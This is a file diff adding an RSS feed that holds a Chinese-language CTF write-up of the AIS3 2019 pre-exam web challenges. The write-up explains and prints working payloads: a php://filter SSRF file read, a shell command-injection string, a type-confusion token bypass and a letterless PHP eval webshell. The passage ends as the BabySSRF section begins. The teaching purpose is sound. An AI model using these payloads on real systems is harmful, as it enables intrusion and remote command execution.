@@ -1,0 +1,1207 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>cyku.tw – CTF</title><link>https://cyku.tw/tags/ctf/</link><description>Recent content in CTF on cyku.tw</description><generator>Hugo -- gohugo.io</generator><language>zh-TW</language><lastBuildDate>Wed, 31 Jul 2019 21:52:55 +0800</lastBuildDate><atom:link href="https://cyku.tw/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>AIS3 2019 Pre-exam Web Write-up</title><link>https://cyku.tw/blog/ais3-2019-pre-exam-web-write-up/</link><pubDate>Wed, 31 Jul 2019 21:52:55 +0800</pubDate><guid>https://cyku.tw/blog/ais3-2019-pre-exam-web-write-up/</guid><description>
+&lt;p&gt;最近 AIS3 2019 的課程正在進行中，於是想起堆在電腦中的 pre-exam 截圖還沒寫成 write-up，趕緊來寫篇文章。個人覺得今年度的 web 題目很優質，沒有太多通靈成分而且還帶到了許多實用知識，然而我其實沒有報名今年度的 AIS3，純粹是因為好奇而偷要到了題目玩玩看 XD&lt;/p&gt;
+&lt;p&gt;首先附上官方出題者的解答：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://blog.djosix.com/ais3-2019-pre-exam-%E5%AE%98%E6%96%B9%E8%A7%A3%E6%B3%95/"target="_blank" rel="noopener"&gt;AIS3 2019 Pre-Exam 官方解法 by Yuankui Lee&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/w181496/AIS3-PreExam-2019"target="_blank" rel="noopener"&gt;AIS3-PreExam-2019 by Kaibro&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;這些解答在 pre-exam 結束後沒多久就公佈了，相信大家應該都已經看完，但我這邊還是再附上一次。&lt;/p&gt;
+&lt;h2&gt;Simple Window&lt;span class="hx:absolute hx:-mt-20" id="simple-window"&gt;&lt;/span&gt;
+&lt;a href="#simple-window" class="subheading-anchor" aria-label="此章節的永久連結"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;開啟首頁馬上就看到一個類似 Virtual Terminal 的畫面，不過這是假的。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10100_01.png" alt="10100_01" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;view-source 一下就能發現 flag 的頁面在 &lt;code&gt;http://ip/flag&lt;/code&gt;，但是直連該頁面會只看到訊息說「I catch it!」&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10100_02.png" alt="10100_02" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;原理其實很單純，瀏覽器支援了一種名為 Service Worker 的功能，常見用途之一是讓你可以在前端自訂快取的行為，當網頁渲染需要載入一些資源 (例如：圖片、CSS 等) 時，可以透過註冊 Service Worker 的功能，阻止瀏覽器發出請求，並由你在前端撰寫的 JavaScript 來控制去哪裡載入這些資源。&lt;/p&gt;
+&lt;p&gt;所以這道題目就是註冊了 Service Worker 來阻止你瀏覽 &lt;code&gt;/flag&lt;/code&gt; 頁面，這點可以從 view-source 看見相關的程式碼，現在的話也能到出題者的 &lt;a href="https://github.com/w181496/AIS3-PreExam-2019/blob/master/SimpleWindow/app.py"target="_blank" rel="noopener"&gt;SimpleWindow - GitHub&lt;/a&gt; 上看看程式碼是如何撰寫的。&lt;/p&gt;
+&lt;p&gt;解法是只要避免經過瀏覽器快取機制而直接向目標伺服器請求該頁面，譬如直接 &lt;code&gt;view-source:http://ip/flag&lt;/code&gt; 或是在 Linux 上使用 curl 指令 &lt;code&gt;curl -v http://ip/flag&lt;/code&gt; 就能獲得 flag。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10100_03.png" alt="10100_03" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;h2&gt;Hidden&lt;span class="hx:absolute hx:-mt-20" id="hidden"&gt;&lt;/span&gt;
+&lt;a href="#hidden" class="subheading-anchor" aria-label="此章節的永久連結"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;點開這道題目的網頁，畫面呈現非常空虛，只有一串文字「Hidden」，HTML 中也沒有其他元素，但是該網頁有引入了一個 JavaScript 檔案：&lt;code&gt;/main.019417bd.js&lt;/code&gt;。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10101_01.png" alt="10101_01" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;從這個 JavaScript 檔案可以看出網頁是使用 Vue.js 前端框架撰寫，看到程式碼就會手癢想先搜尋「flag」，發現有個 &lt;code&gt;&amp;quot;./flag.js&amp;quot;: &amp;quot;nHHx&amp;quot;&lt;/code&gt;，這是前端打包工具很常見的特徵，因為前端框架都採用了模組化方式進行開發，但是瀏覽器多半不支援這些模組化方式的程式碼，所以會再透過打包工具將這些框架程式碼轉換為瀏覽器能接受的 JavaScript，而 &lt;code&gt;&amp;quot;./flag.js&amp;quot;: &amp;quot;nHHx&amp;quot;&lt;/code&gt; 就是其中一個模組。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10101_02.png" alt="10101_02" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;將上述的 &lt;code&gt;nHHx&lt;/code&gt; 繼續搜尋就能找到模組原始的定義位置，從程式碼可以看到該模組 export 了一個 &lt;code&gt;function r()&lt;/code&gt;。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10101_03.png" alt="10101_03" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;總而言之把 &lt;code&gt;function r()&lt;/code&gt; 直接丟 Console 跑跑看，就能順利拿到 flag。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10101_04.png" alt="10101_04" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;h2&gt;tokeeeeen&lt;span class="hx:absolute hx:-mt-20" id="tokeeeeen"&gt;&lt;/span&gt;
+&lt;a href="#tokeeeeen" class="subheading-anchor" aria-label="此章節的永久連結"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;首頁有一個輸入框可以輸入 token。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10102_01.png" alt="10102_01" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;按下 submit 按鈕後會發出一個 AJAX 去位置 &lt;code&gt;/flag?token=aa&lt;/code&gt; 請求 flag，但會顯示一些像「No, please.」可能代表 token 錯誤的訊息。推測這道題目也許是要你找出正確的 token 拿 flag?&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10102_02.png" alt="10102_02" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;先別著急著瞎猜，讓我們再嘗試收集一些資訊，並很快就能發現伺服器上還有一個檔案 &lt;code&gt;package.json&lt;/code&gt;，這是 Node.js 套件管理工具 npm 所使用來描述一些資訊的檔案。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10102_03.png" alt="10102_03" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;再試著存取 &lt;code&gt;package.json&lt;/code&gt; 中所描述到的 &lt;code&gt;server.js&lt;/code&gt;，發現也能看見完整的原始碼。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10102_04.png" alt="10102_04" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;從原始碼中可以發現對 token 的檢查有三個條件：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;!token&lt;/code&gt;: token 參數要存在，不能為空、null 或 undefined&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;token.length &amp;gt; 32&lt;/code&gt;: token 字串長度要大於 32&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;0 &amp;lt; token.length &amp;lt; 16&lt;/code&gt;: 這個是 .. 字串長度介於 0~16 .. 嗎？&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;看起來似乎第二點和第三點自相矛盾，但其實是個障眼法，在 JavaScript 並沒有像數學式般 &lt;code&gt;a &amp;lt; b &amp;lt; c&lt;/code&gt; 這樣的使用方式，&lt;code&gt;&amp;lt;&lt;/code&gt; 只能一次對兩者做比較，所以第三點在 JavaScript 眼裡是 &lt;code&gt;(0 &amp;lt; token.length) &amp;lt; 16&lt;/code&gt;，在這邊的情境下將會永遠為 true，因為 &lt;code&gt;(0 &amp;lt; token.length)&lt;/code&gt; 必定會得到一個 true 的 Boolean 值，而 &lt;code&gt;true &amp;lt; 16&lt;/code&gt; 經過轉型處理後再判斷也必然為 true。&lt;/p&gt;
+&lt;p&gt;那這道題目該何解？讓我們再回顧一下程式碼，如果夠細心應該能立刻發現只有傳送 flag 的程式碼 &lt;code&gt;res.send(FLAG)&lt;/code&gt; 是被放置在 try catch 敘述句外的，而 catch 敘述句只捕捉了 TokenError 的錯誤，表示若我們能讓 JavaScript 噴出 TokenError 以外的 exception，就能抵達 &lt;code&gt;res.send(FLAG)&lt;/code&gt; 的程式碼。&lt;/p&gt;
+&lt;p&gt;要讓 JavaScript 程式出現錯誤，第一個直覺會聯想到 Type Confusion，因為它是動態型別的語言，可以讓同一個變數偶而是 string 偶而又是 object，這道題目裡又沒有任何的型別檢查，所以其實我們可以透過 &lt;code&gt;?token[a]=1&lt;/code&gt; 的方式讓 token 變數成為 object 型別。但這並不至於讓程式噴 exception，因為目前程式中的所有操作在 object 型別上都是合法的，譬如 &lt;code&gt;token.length&lt;/code&gt; 也只是回傳 undefined 再去隱性轉型作數字比較。&lt;/p&gt;
+&lt;p&gt;這就要談及 JavaScript 的一個 magic method: &lt;code&gt;toString&lt;/code&gt;，當你嘗試對一個 object 進行數值 (隱性型別轉換) 或字串操作時，JavaScript 會呼叫 &lt;code&gt;object.toString()&lt;/code&gt; 來把物件轉換成字串，我們也能透過 override 這個函式來自定義如何轉換成字串的行為。&lt;/p&gt;
+&lt;p&gt;譬如以下程式碼：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;var a = {
+toString: function() {
+return &amp;#39;Hello, world!&amp;#39;;
+}
+};
+console.log(&amp;#39;Result: &amp;#39; &amp;#43; a);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;會得到以下輸出：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;Result: Hello, world!&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;那如果我們將 toString override 成 function 以外的東西：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;var a = {
+toString: 123
+};
+console.log(&amp;#39;Result: &amp;#39; &amp;#43; a);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;就會發現神奇的結果：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;Uncaught TypeError: Cannot convert object to primitive value&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;所以這道題目只要送 &lt;code&gt;token[length][toString]&lt;/code&gt; 讓 length 成為 object 並 override 掉 toString，就會在第二個比較條件嘗試將 object 作轉換而呼叫到 toString 時噴出 TypeError，如此這般就能得到 flag。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10102_05.png" alt="10102_05" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;除此之外還有一個 valueOf 的 magic method，兩者關係可以去看出題者官方解法裡有更詳細的描述。&lt;/p&gt;
+&lt;h2&gt;d1v1n6&lt;span class="hx:absolute hx:-mt-20" id="d1v1n6"&gt;&lt;/span&gt;
+&lt;a href="#d1v1n6" class="subheading-anchor" aria-label="此章節的永久連結"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;題目頁面有一個超連結文字 Hint 連結到 &lt;code&gt;/?path=hint.txt&lt;/code&gt;，熟悉的朋友很快就能聯想到這邊或許存在一個可能是 Arbitrary File Read、Local File Inclusion 或 Server-Side Request Forgery 的漏洞。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10103_01.png" alt="10103_01" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;經過黑箱觀察可以發現網頁是由 PHP 撰寫並且是個 SSRF 漏洞，但是嘗試讀 index.php 的原始碼只會出現錯誤文字訊息，讓我們試試用老招：&lt;code&gt;php://filter/read=convert.base64-encode/resource=index.php&lt;/code&gt;，成功讀到 base64 編碼後的原始碼。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10103_02.png" alt="10103_02" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;看看原始碼，看起來是個要繞 Server-Side Request Forgery 保護去請求 127.0.0.1 的挑戰，如果成功讓 PHP 從 127.0.0.1 來源請求 &lt;code&gt;http://127.0.0.1&lt;/code&gt;，第 6 行就會顯示 flag 的提示。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10103_03.png" alt="10103_03" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;於是只要輸入&lt;br&gt;
+&lt;code&gt;php://filter/read=convert.base64-encode/resource=http://localhost&lt;/code&gt;&lt;br&gt;
+就過了，因為出題者不小心把 regular expression 寫壞，所以用 localhost 而不是 127.0.0.1 就能過 XD。&lt;br&gt;
+大家可以先試著自己找錯誤在哪，想知道錯在哪可以去看出題者官方解法的描述。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10103_04.png" alt="10103_04" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;base64 解碼後就能得知存有 flag 的文字檔位置和下一階段的提示。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10103_05.png" alt="10103_05" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;h2&gt;d1v1n6 d33p3r&lt;span class="hx:absolute hx:-mt-20" id="d1v1n6-d33p3r"&gt;&lt;/span&gt;
+&lt;a href="#d1v1n6-d33p3r" class="subheading-anchor" aria-label="此章節的永久連結"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;這題是接續上一題 d1v1n6，在上一題的提示中說這題的 flag 似乎是隱藏在 internal network 中的某處。&lt;/p&gt;
+&lt;p&gt;在 Server-Side Request Forgery 的利用中，掌握內網相關資訊 (IP、Domain) 非常重要，畢竟在茫茫內網大海中撈針的效率很差。在這道題目中的 SSRF 漏洞具有讀檔的能力，所以我們通常可先嘗試讀取以下幾個 Linux 主機上的重要檔案&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;/etc/resolv.conf&lt;/strong&gt;: 可以得知 nameserver 配置的資訊&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/etc/hosts&lt;/strong&gt;: 可以得知 hostname 與 ip 作 mapping 的資訊&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/proc/net/tcp&lt;/strong&gt;: 會列出 listen 中的 TCP 連線，有機會可以得知當前主機的 ip 資訊&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;這邊我是先讀取了 &lt;strong&gt;/proc/net/tcp&lt;/strong&gt; 就發現有個 listen 中的 TCP 連線 IP 為 &lt;code&gt;030016AC&lt;/code&gt;，這個字串其實是 IPv4 中 4 個區段的十進位數字轉換成 hex 的結果，只不過順序是相反的，對應方式是：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;172 . 22 . 0 . 3
+AC 16 00 03&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2019/07/10103_06.png" alt="10103_06" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;在確定當前主機的 IP 為 172.22.0.3 後，簡單黑箱測試就可以馬上發現在隔壁的 172.22.0.2 有個奇怪的網頁服務，他接受一個參數 dir，然後會幫你印出資料夾的內容，有沒有覺得很像「ls -la」的指令結果？&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10103_07.png" alt="10103_07" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;沒錯，就是一個 Command Injection，只要 &lt;code&gt;?dir=';id;echo '&lt;/code&gt; 就能注入成功。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10103_08.png" alt="10103_08" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;查看 172.22.0.2 上的 index.php 原始碼，就能獲得第二把 flag。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10103_09.png" alt="10103_09" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;h2&gt;3v4l&lt;span class="hx:absolute hx:-mt-20" id="3v4l"&gt;&lt;/span&gt;
+&lt;a href="#3v4l" class="subheading-anchor" aria-label="此章節的永久連結"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;題目直接給了 PHP 原始碼，但是排版非常雜亂。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10105_01.png" alt="10105_01" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;簡單手動重新排版後就能很明顯看到程式的邏輯，主要是會把傳進來的參數 &lt;code&gt;$_GET['#']&lt;/code&gt; 丟進 eval 執行，但是有幾個小限制：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;不能有英文字母 (包括大、小寫)&lt;/li&gt;
+&lt;li&gt;不能超過 18 個字元&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2019/07/10105_02.png" alt="10105_02" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;這道題目的目標很明確，就是相當於構造一個無字母的 WebShell，這就要用到 PHP 神奇特性，利用 PHP 的 &lt;code&gt;~&lt;/code&gt; NOT 運算子，我們可以做到執行 &lt;code&gt;(~%8C%86%8C%8B%9A%92)()&lt;/code&gt; (不可視字元顯示不出來，所以習慣用 url encode 來表示) 相當於執行 &lt;code&gt;system()&lt;/code&gt;，因為 PHP 會先把 &lt;code&gt;%8C%86%8C%8B%9A%92&lt;/code&gt; 的字串作 &lt;code&gt;~&lt;/code&gt; NOT 後再呼叫該字串代表的函式。但因為題目限制不能超過 18 個字元，雖然用 system 有機會湊出剛剛好的指令，但沒有好用的完整 shell 實在痛苦 Q_Q&lt;/p&gt;
+&lt;p&gt;PHP 是很棒的語言，不是只有 system 函式可以執行系統指令，它自帶一個反引號的運算子可以執行系統指令：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;echo `id`; // 執行 id 系統指令&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;更棒的是這個運算子還有 double evaluation 特性，如果你給的字串中有 $ 開頭的字或 ${變數名稱} 的字樣，它會先嘗試解析找出對應的變數，再把變數的值拿來當系統指令執行。&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;$a = &amp;#39;id&amp;#39;;
+echo `$a`; // 執行 id 系統指令&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;更多的範例可以參考 PHP 官方文件：&lt;br&gt;
+&lt;a href="https://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.double"target="_blank" rel="noopener"&gt;Strings #Double quoted&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;總之我們可以利用前述的 NOT 運算子和反引號運算子的 double evaluation 特性，構造出以下 payload:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;`{${~%A0%B8%BA%AB}[0]}`;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;這個 payload 執行時，PHP 會先把 &lt;code&gt;%A0%B8%BA%AB&lt;/code&gt; 字串作 NOT 運算得到 &lt;code&gt;_GET&lt;/code&gt;，&lt;code&gt;${~%A0%B8%BA%AB}&lt;/code&gt; 再去解析取得 &lt;code&gt;$_GET&lt;/code&gt; 變數，之後變成像 &lt;code&gt;{$_GET[0]}&lt;/code&gt; 取得 &lt;code&gt;$_GET&lt;/code&gt; 陣列中 index 為 0 的值，最終把這個值當系統指令去執行。&lt;/p&gt;
+&lt;p&gt;所以只要在參數上給 &lt;code&gt;?0=id&lt;/code&gt; 就能輕鬆執行任何長度的系統指令並獲得 flag。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10105_03.png" alt="10105_03" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;h2&gt;BabySSRF&lt;span class="hx:absolute hx:-mt-20" id="babyssrf"&gt;&lt;/span&gt;
+&lt;a href="#babyssrf" class="subheading-anchor" aria-label="此章節的永久連結"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;題目就說明了一切，就是打 Server-Side Request Forgery。&lt;br&gt;
